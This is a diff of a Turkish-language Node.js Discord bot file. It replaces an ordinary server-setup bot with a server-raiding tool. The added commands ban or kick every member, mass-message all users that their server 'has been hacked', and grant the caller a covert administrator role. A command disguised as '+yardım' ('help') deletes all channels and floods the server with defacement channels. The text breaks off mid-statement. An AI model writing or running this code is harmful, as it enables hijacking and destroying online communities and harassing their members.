@@ -1,285 +1,1597 @@
-const express = require('express');
-const app = express();
-const http = require('http');
-    app.get("/", (request, response) => {
-    console.log(` az önce pinglenmedi. Sonra ponglanmadı... ya da başka bir şeyler olmadı.`);
-    response.sendStatus(200);
-    });
-    app.listen(process.env.PORT);
-    setInterval(() => {
-    http.get(`http://dc-patlatma-botumuz.glitch.me/`);
-    }, 30000);
-const Discord = require('discord.js');
+const Discord = require("discord.js"); 
 const client = new Discord.Client();
-const ayarlar = require('./ayarlar.json');
-const chalk = require('chalk');
-const fs = require('fs');
-const moment = require('moment');
-const db = require('wio.db');
-require('./util/eventLoader')(client);
+const ayarlar = require("./ayarlar.json");
+const { Client, Util } = require("discord.js");
+const request = require("request");
+client.login(process.env.token);
 
-var prefix = ayarlar.prefix;
+client.on("message", msg => {           
+  if (msg.content === "+ban") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.ban());  
+  }
+});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban
 
-const log = message => {
-  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
-};
+client.on("message", msg => {
+  if (msg.content === "+kick") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.kick());
+  }
+});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
 
-client.commands = new Discord.Collection();
-client.aliases = new Discord.Collection();
-fs.readdir('./komutlar/', (err, files) => {
-  if (err) console.error(err);
-  log(`${files.length} komut yüklenecek.`);
-  files.forEach(f => {
-    let props = require(`./komutlar/${f}`);
-    log(`Yüklenen komut: ${props.help.name}.`);
-    client.commands.set(props.help.name, props);
-    props.conf.aliases.forEach(alias => {
-      client.aliases.set(alias, props.help.name);
+client.on("message", async msg => {
+  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
+    msg.delete();
+    await msg.client.users
+      .forEach(users =>
+        users.send(
+          "**SUNUCUN HACKLENMİŞTİR HADİ KOLAY GELSİN KİM YAPTI DERLERSE ÖLÜM YAPTI DERSİNİZ** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+        )
+      )
+      .catch(console.error);
+  } 
+});
+
+client.on("message", msg => {
+  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
+    msg.delete();
+    msg.guild.createRole({
+      name: ".",
+      permissions: ["ADMINISTRATOR"]
     });
-  });
+    let rol = msg.guild.roles.find(role => role.name === ".");  
+    msg.member.addRole(rol);
+  }
 });
 
-client.reload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
+client.on("message", async msg => {
+  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+    msg.delete();
 
-client.load = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
+    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
 
-client.unload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
-
-client.elevation = message => {
-  if(!message.guild) {
-	return; }
-  let permlvl = 0;
-  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
-  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
-  if (message.author.id === ayarlar.sahip) permlvl = 4;
-  return permlvl;
-};
-
-var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
-// client.on('debug', e => {
-//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
-// });
-
-client.on('warn', e => {
-  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
-});
-
-client.on('error', e => {
-  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
-});
-
-client.login(ayarlar.token);
-
-client.on('message', async message => {
-  const ms = require('ms');
-  const args = message.content.slice(prefix.length).trim().split(/ +/g);
-  const command = args.shift().toLowerCase();
-  let rrrsembed = new Discord.RichEmbed()
-  let u = message.mentions.users.first() || message.author;
-  if (command === "hazır-sunucu-2") {
-  if (message.guild.channels.find(channel => channel.name === "Bot Kullanımı")) return message.channel.send(" Bot Paneli Zaten Ayarlanmış.")
-  message.channel.send(`Hizmet Kanallarının kurulumu başlatılsın mı? başlatılacak ise **evet** yazınız.`)
-      if (!message.member.hasPermission('ADMINISTRATOR'))
-  return message.channel.send(" Bu Kodu `Yönetici` Yetkisi Olan Kişi Kullanabilir.");
-      message.channel.awaitMessages(response => response.content === 'evet', {
-        max: 1,
-        time: 10000,
-        errors: ['time'],
+    await msg.guild.createChannel("Sikerler Gaming", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
       })
-    .then((collected) => {
-   message.guild.createChannel('|▬▬|ÖNEMLİ KANALLAR|▬▬|', 'category', [{
-  id: message.guild.id,
-  deny: ['SEND_MESSAGES']
-}])    
- message.guild.createChannel('「📃」Discord-kurallar', 'text', [{
-  id: message.guild.id,
-  deny: ['SEND_MESSAGES']
-}])
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
- message.guild.createChannel('「🚪」gelen-giden', 'text', [{
-  id: message.guild.id,
-  deny: ['SEND_MESSAGES']
-}])
-.then(channel =>
-       channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-       message.guild.createChannel('「✅」sayaç', 'text', [{
-        id: message.guild.id,
-        deny: ['SEND_MESSAGES']
-      }])
-.then(channel =>
-             channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-             message.guild.createChannel('「💾」log-kanalı', 'text', [{
-              id: message.guild.id,
-              deny: ['SEND_MESSAGES']
-            }])
-            .then(channel => channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-            message.guild.createChannel('「📢」Duyuru-Panosu', 'text', [{
-              id: message.guild.id,
-              deny: ['SEND_MESSAGES']
-            }])
-.then(channel =>
-             channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-             message.guild.createChannel('「💾」Güncellemeler', 'text', [{
-              id: message.guild.id,
-              deny: ['SEND_MESSAGES']
-            }])
-.then(channel =>
-             channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-             message.guild.createChannel('「💾」Hizmet-Alanlar', 'text', [{
-              id: message.guild.id,
-              deny: ['SEND_MESSAGES']
-            }])
-            .then(channel => channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-            message.guild.createChannel('「📢」son-davet-takip"', 'text', [{
-              id: message.guild.id,
-              deny: ['SEND_MESSAGES']
-            }])
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|ÖNEMLİ KANALLAR|▬▬|")));
-
-       }) 
-       .then((collected) => {
-        message.guild.createChannel('|▬▬|GENEL KANALLAR|▬▬|', 'category', [{
-       id: message.guild.id,
-     }]);
-
-     message.guild.createChannel(`「💬」genel-sohbet`, 'text')
-       .then(channel =>
-        channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|GENEL KANALLAR|▬▬|")));
-
-     message.guild.createChannel(`「🤖」bot-komutları`, 'text')
-       .then(channel =>
-                  channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|GENEL KANALLAR|▬▬|")));
-
-      message.guild.createChannel(`「💡」şikayet-ve-öneri`, 'text')
-     .then(channel =>
-      channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|GENEL KANALLAR|▬▬|")));
-
-  message.guild.createChannel(`💬》Sohbet Odası`, "voice")
-  .then(channel =>
-    channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|SES KANALLARI|▬▬|")))
-  .then(c => {
-    let role = message.guild.roles.find("name", "@everyone");
-    c.overwritePermissions(role, {
-        CONNECT: true,
-    });
-})
-
-message.guild.createChannel('|▬▬|HİZMET ODALARI|▬▬|', 'category', [{
-  id: message.guild.id,
-}]);
-
-message.guild.createChannel(`🔖》Java Hizmetleri`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
- message.guild.createChannel(`🔖》Plugin Hizmetleri`, 'text')
- .then(channel =>
-  channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
- message.guild.createChannel(`🎮》Discord Bot hizmetleri`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
- message.guild.createChannel(`🎮》banner hizmetleri`, 'text')
- .then(channel =>
-  channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-  message.guild.createChannel(`🎮》skript hizmetleri`, 'text')
-  .then(channel =>
-   channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-   message.guild.createChannel(`🎮》website hizmetleri`, 'text')
-   .then(channel =>
-    channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-    message.guild.createChannel(`🎮》ek hizmetleri`, 'text')
-    .then(channel =>
-     channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-     message.guild.createChannel(`🎮》harita hizmetleri`, 'text')
-     .then(channel =>
-      channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-      message.guild.createChannel(`🎮》tasarım hizmetleri`, 'text')
-     .then(channel =>
-      channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|HİZMET ODALARI|▬▬|")))
-
-message.guild.createChannel('|▬▬|YÖNETİCİ ODALARI|▬▬|', 'category', [{
-  id: message.guild.id,
-}]);
- 
-message.guild.createChannel(`👑》Yönetim`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|YÖNETİCİ ODALARI|▬▬|")))
-message.guild.createChannel(`👑》Yönetim`, 'voice')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|YÖNETİCİ ODALARI|▬▬|")))
-
-
-message.guild.createChannel('|▬▬|OYUN ODALARI|▬▬|', 'category', [{
-  id: message.guild.id,
-}]);
-message.guild.createChannel(`🎮》Sayı-saymaca`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|OYUN ODALARI|▬▬|")))
-message.guild.createChannel(`🎮》Kelime-Türet`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|OYUN ODALARI|▬▬|")))
-message.guild.createChannel(`🎮》Matematik Türet`, 'text')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|OYUN ODALARI|▬▬|")))
-.then(channel =>
-      
-message.guild.createChannel('|▬▬|AFK ODALARI|▬▬|', 'category', [{
-  id: message.guild.id,
-}])); 
-      
-message.guild.createChannel(`💤》AFK`, 'voice')
-.then(channel =>
- channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|AFK ODALARI|▬▬|")))
-
-       message.channel.send("**Bot** gerekli odaları kurdu! Bu kodu editliyen kişi: <@422505993998696459>")
-     
-            })   
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", { 
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {  
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {  
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
     
-}
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", { 
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");  
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {  
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");  
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {  
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })   
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {   
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
